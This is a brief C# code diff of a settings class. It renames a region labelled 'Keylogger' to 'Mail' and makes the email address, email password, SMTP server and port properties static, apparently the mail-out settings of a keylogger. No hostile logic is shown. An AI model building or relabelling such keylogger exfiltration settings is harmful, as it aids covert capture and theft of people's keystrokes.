@@ -8,15 +8,15 @@ namespace sub
     {
         #region Settings
 
-        #region Keylogger
+        #region Mail
 
-        public string EmailAddress { get; set; }
+        public static string EmailAddress { get; set; }
 
-        public string EmailPassword { get; set; }
+        public static string EmailPassword { get; set; }
 
-        public string SmtpAddress { get; set; }
+        public static string SmtpAddress { get; set; }
 
-        public int SmtpPort { get; set; }
+        public static int SmtpPort { get; set; }
 
         #endregion
 
